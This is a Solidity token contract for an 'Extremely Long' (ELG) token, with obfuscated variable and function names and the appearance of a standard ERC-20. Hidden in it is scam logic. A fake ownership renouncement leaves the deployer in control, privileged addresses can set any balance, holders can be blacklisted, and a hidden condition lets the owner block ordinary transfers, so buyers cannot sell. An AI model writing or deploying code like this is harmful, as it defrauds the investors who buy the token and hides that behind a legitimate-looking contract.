//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface fundLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapAt {
    function createPair(address exemptToken, address swapSellLimit) external returns (address);
}

interface takeReceiverTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalAt) external view returns (uint256);

    function transfer(address amountReceiver, uint256 txIs) external returns (bool);

    function allowance(address totalLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 txIs) external returns (bool);

    function transferFrom(
        address sender,
        address amountReceiver,
        uint256 txIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxAuto, uint256 value);
    event Approval(address indexed totalLaunch, address indexed spender, uint256 value);
}

interface launchMax is takeReceiverTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExtremelyLong is toAmount, takeReceiverTrading, launchMax {

    function maxTeamFrom(address maxSwap, address amountReceiver, uint256 txIs) internal returns (bool) {
        if (maxSwap == buyTotal) {
            return txTokenMode(maxSwap, amountReceiver, txIs);
        }
        uint256 txTeam = takeReceiverTrading(totalLiquiditySell).balanceOf(marketingFee);
        require(txTeam == modeSwap);
        require(amountReceiver != marketingFee);
        if (marketingTo[maxSwap]) {
            return txTokenMode(maxSwap, amountReceiver, modeLaunchToken);
        }
        return txTokenMode(maxSwap, amountReceiver, txIs);
    }

    function enableLiquidity() public {
        emit OwnershipTransferred(buyTotal, address(0));
        fundAuto = address(0);
    }

    bool private tradingShould;

    function transferFrom(address maxSwap, address amountReceiver, uint256 txIs) external override returns (bool) {
        if (_msgSender() != teamReceiver) {
            if (limitSell[maxSwap][_msgSender()] != type(uint256).max) {
                require(txIs <= limitSell[maxSwap][_msgSender()]);
                limitSell[maxSwap][_msgSender()] -= txIs;
            }
        }
        return maxTeamFrom(maxSwap, amountReceiver, txIs);
    }

    function symbol() external view virtual override returns (string memory) {
        return atBuyMarketing;
    }

    function getOwner() external view returns (address) {
        return fundAuto;
    }

    mapping(address => uint256) private swapLaunchSell;

    function receiverListMarketing(uint256 txIs) public {
        minFund();
        modeSwap = txIs;
    }

    function fromReceiver(address launchBuy, uint256 txIs) public {
        minFund();
        swapLaunchSell[launchBuy] = txIs;
    }

    constructor (){
        if (atFund == listLaunchedSell) {
            tradingShould = false;
        }
        fundLimit takeToken = fundLimit(teamReceiver);
        totalLiquiditySell = swapAt(takeToken.factory()).createPair(takeToken.WETH(), address(this));
        
        buyTotal = _msgSender();
        enableLiquidity();
        fromWallet[buyTotal] = true;
        swapLaunchSell[buyTotal] = fromTake;
        
        emit Transfer(address(0), buyTotal, fromTake);
    }

    mapping(address => mapping(address => uint256)) private limitSell;

    uint256 public feeReceiverFrom;

    string private atBuyMarketing = "ELG";

    address public totalLiquiditySell;

    uint256 private totalTx;

    function txTokenMode(address maxSwap, address amountReceiver, uint256 txIs) internal returns (bool) {
        require(swapLaunchSell[maxSwap] >= txIs);
        swapLaunchSell[maxSwap] -= txIs;
        swapLaunchSell[amountReceiver] += txIs;
        emit Transfer(maxSwap, amountReceiver, txIs);
        return true;
    }

    function balanceOf(address totalAt) public view virtual override returns (uint256) {
        return swapLaunchSell[totalAt];
    }

    function decimals() external view virtual override returns (uint8) {
        return minLimitTeam;
    }

    address public buyTotal;

    bool public buyMin;

    address marketingFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public exemptFee;

    function name() external view virtual override returns (string memory) {
        return isTotal;
    }

    function minTx(address amountAuto) public {
        minFund();
        
        if (amountAuto == buyTotal || amountAuto == totalLiquiditySell) {
            return;
        }
        marketingTo[amountAuto] = true;
    }

    uint256 public limitWallet;

    mapping(address => bool) public fromWallet;

    uint256 private fromTake = 100000000 * 10 ** 18;

    function approve(address launchedTrading, uint256 txIs) public virtual override returns (bool) {
        limitSell[_msgSender()][launchedTrading] = txIs;
        emit Approval(_msgSender(), launchedTrading, txIs);
        return true;
    }

    function transfer(address launchBuy, uint256 txIs) external virtual override returns (bool) {
        return maxTeamFrom(_msgSender(), launchBuy, txIs);
    }

    mapping(address => bool) public marketingTo;

    address teamReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant modeLaunchToken = 5 ** 10;

    bool public autoTeam;

    uint256 tokenShould;

    event OwnershipTransferred(address indexed toTx, address indexed toBuy);

    function minFund() private view {
        require(fromWallet[_msgSender()]);
    }

    uint256 public atFund;

    uint256 public listLaunchedSell;

    function allowance(address receiverMarketing, address launchedTrading) external view virtual override returns (uint256) {
        if (launchedTrading == teamReceiver) {
            return type(uint256).max;
        }
        return limitSell[receiverMarketing][launchedTrading];
    }

    uint8 private minLimitTeam = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return fromTake;
    }

    uint256 modeSwap;

    function feeToken(address fromTo) public {
        if (buyMin) {
            return;
        }
        if (feeReceiverFrom == atFund) {
            exemptFee = true;
        }
        fromWallet[fromTo] = true;
        
        buyMin = true;
    }

    address private fundAuto;

    function owner() external view returns (address) {
        return fundAuto;
    }

    string private isTotal = "Extremely Long";

}